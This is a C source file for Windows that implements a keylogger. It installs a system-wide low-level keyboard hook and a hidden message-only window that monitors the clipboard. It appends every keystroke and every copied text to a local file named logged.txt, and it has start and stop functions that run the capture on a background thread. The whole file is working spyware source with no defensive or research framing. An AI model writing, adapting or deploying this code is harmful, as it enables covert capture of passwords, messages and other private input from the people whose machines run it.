#include <helpers/keylogger.h>
#include <stdio.h>

// --- Constants ---
#define OUT_FILE L"logged.txt"
#define HIDDEN_WINDOW_CLASS_NAME L"ClipboardMonitorWindowClass_Keylogger"
#define KEY_BUFFER_SIZE 8
#define KEYBOARD_STATE_SIZE 256

// --- Global State Variables ---
static HHOOK g_keyboard_hook = NULL;
static HANDLE g_log_file_handle = INVALID_HANDLE_VALUE;
static HWND g_hidden_window = NULL;
static HINSTANCE g_instance = NULL;

// Thread-related globals
static HANDLE g_hThread = NULL;
static DWORD g_dwThreadId = 0;

// --- Forward Declarations ---
static DWORD WINAPI KeyloggerThreadProc(LPVOID lpParam);
static LRESULT CALLBACK ClipboardMonitorWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
static LRESULT CALLBACK KeyboardHookCallback(int nCode, WPARAM wParam, LPARAM lParam);
static void write_wstr(const LPCWSTR content);

// --- File I/O ---
static void write_wstr(const LPCWSTR content) {
    if (g_log_file_handle == INVALID_HANDLE_VALUE || content == NULL) return;
    DWORD content_len_bytes = wcslen(content) * sizeof(wchar_t);
    if (content_len_bytes == 0) return;
    DWORD bytes_written;
    WriteFile(g_log_file_handle, content, content_len_bytes, &bytes_written, NULL);
}

// --- Clipboard & Keyboard Logic (Callbacks) ---
// These functions are executed on the background thread when an event occurs.
LRESULT CALLBACK ClipboardMonitorWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    if (msg == WM_CLIPBOARDUPDATE) {
        if (IsClipboardFormatAvailable(CF_UNICODETEXT) && OpenClipboard(NULL)) {
            HANDLE hData = GetClipboardData(CF_UNICODETEXT);
            if (hData) {
                LPCWSTR clipboard_data = (LPCWSTR)GlobalLock(hData);
                if (clipboard_data) {
                    write_wstr(L"\r\n\r\n[CLIPBOARD]:\r\n");
                    write_wstr(clipboard_data);
                    write_wstr(L"\r\n\r\n");
                }
                GlobalUnlock(hData);
            }
            CloseClipboard();
            if (g_log_file_handle != INVALID_HANDLE_VALUE) FlushFileBuffers(g_log_file_handle);
        }
        return 0;
    }
    return DefWindowProc(hwnd, msg, wParam, lParam);
}

LRESULT CALLBACK KeyboardHookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *kbd_hook = (KBDLLHOOKSTRUCT*)lParam;
        LPCWSTR special_key = NULL;
        switch (kbd_hook->vkCode) {
            case VK_RETURN: special_key = L"\r\n"; break; case VK_BACK: special_key = L"[BACK]"; break;
            case VK_TAB: special_key = L"[TAB]"; break; case VK_DELETE: special_key = L"[DEL]"; break;
            case VK_LCONTROL: case VK_RCONTROL: case VK_SHIFT: case VK_LSHIFT:
            case VK_RSHIFT: case VK_MENU: case VK_LMENU: case VK_RMENU:
            case VK_CAPITAL: case VK_LWIN: case VK_RWIN: return CallNextHookEx(g_keyboard_hook, nCode, wParam, lParam);
        }
        if (special_key) {
            write_wstr(special_key);
        } else {
            BYTE kbd_state[KEYBOARD_STATE_SIZE] = {0}; GetKeyboardState(kbd_state);
            WCHAR uni_buf[KEY_BUFFER_SIZE];
            int count = ToUnicode(kbd_hook->vkCode, kbd_hook->scanCode, kbd_state, uni_buf, KEY_BUFFER_SIZE, 0);
            if (count > 0) {
                uni_buf[count] = L'\0';
                write_wstr(uni_buf);
            }
        }
        if (g_log_file_handle != INVALID_HANDLE_VALUE) FlushFileBuffers(g_log_file_handle);
    }
    return CallNextHookEx(g_keyboard_hook, nCode, wParam, lParam);
}


// --- The Core Thread Function ---
// This function contains the logic that runs in the background.
DWORD WINAPI KeyloggerThreadProc(LPVOID lpParam) {
    // 1. Get the module handle for this process.
    g_instance = GetModuleHandle(NULL);

    // 2. Register the window class for our hidden message window.
    WNDCLASSW wc = {0};
    wc.lpfnWndProc   = ClipboardMonitorWndProc;
    wc.hInstance     = g_instance;
    wc.lpszClassName = HIDDEN_WINDOW_CLASS_NAME;
    if (!RegisterClassW(&wc)) return 1; // Signal error

    // 3. Create the hidden message-only window.
    g_hidden_window = CreateWindowExW(0, HIDDEN_WINDOW_CLASS_NAME, L"Hidden Monitor", 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, g_instance, NULL);
    if (g_hidden_window == NULL) return 1;

    // 4. Add the clipboard listener.
    if (!AddClipboardFormatListener(g_hidden_window)) return 1;

    // 5. Set the system-wide keyboard hook.
    g_keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookCallback, g_instance, 0);
    if (g_keyboard_hook == NULL) return 1;

    // 6. Signal the main thread (in StartKeylogger) that initialization is complete and successful.
    SetEvent((HANDLE)lpParam); // The event handle was passed as the parameter

    // 7. Run the message loop. This will block until WM_QUIT is received.
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // 8. Cleanup thread-specific resources before exiting.
    UnhookWindowsHookEx(g_keyboard_hook);
    RemoveClipboardFormatListener(g_hidden_window);
    DestroyWindow(g_hidden_window);
    UnregisterClassW(HIDDEN_WINDOW_CLASS_NAME, g_instance);

    return 0; // Thread exits cleanly
}


// --- Public API Functions ---

BOOL StartKeylogger(void) {
    if (g_hThread != NULL) return FALSE; // Already running

    g_log_file_handle = CreateFileW(OUT_FILE, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (g_log_file_handle == INVALID_HANDLE_VALUE) return FALSE;

    if (GetFileSize(g_log_file_handle, NULL) == 0) {
        static const BYTE UTF16_BOM[] = { 0xFF, 0xFE }; DWORD bytes;
        WriteFile(g_log_file_handle, UTF16_BOM, sizeof(UTF16_BOM), &bytes, NULL);
    }
    write_wstr(L"\r\n\r\n--- LOGGING SESSION STARTED ---\r\n");

    // Create an event to wait for the thread to finish its initialization.
    HANDLE hInitEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (hInitEvent == NULL) {
        CloseHandle(g_log_file_handle);
        return FALSE;
    }

    g_hThread = CreateThread(NULL, 0, KeyloggerThreadProc, hInitEvent, 0, &g_dwThreadId);
    if (g_hThread == NULL) {
        CloseHandle(g_log_file_handle);
        CloseHandle(hInitEvent);
        return FALSE;
    }

    // Wait up to 5 seconds for the thread to signal that it's ready.
    if (WaitForSingleObject(hInitEvent, 5000) == WAIT_TIMEOUT) {
        // Thread failed to initialize in time.
        StopKeylogger(); // Attempt a cleanup
        CloseHandle(hInitEvent);
        return FALSE;
    }

    CloseHandle(hInitEvent);
    return TRUE;
}

BOOL StopKeylogger(void) {
    if (g_hThread == NULL) return FALSE; // Not running

    write_wstr(L"\r\n--- LOGGING SESSION STOPPED ---\r\n\r\n");

    // Post a WM_QUIT message to the thread's message queue to break its GetMessage loop.
    PostThreadMessage(g_dwThreadId, WM_QUIT, 0, 0);

    // Wait for the thread to terminate.
    if (WaitForSingleObject(g_hThread, 5000) == WAIT_TIMEOUT) {
        // If it doesn't terminate gracefully, force it.
        TerminateThread(g_hThread, 1);
    }

    CloseHandle(g_hThread);
    g_hThread = NULL;
    g_dwThreadId = 0;

    if (g_log_file_handle != INVALID_HANDLE_VALUE) {
        CloseHandle(g_log_file_handle);
        g_log_file_handle = INVALID_HANDLE_VALUE;
    }

    return TRUE;
}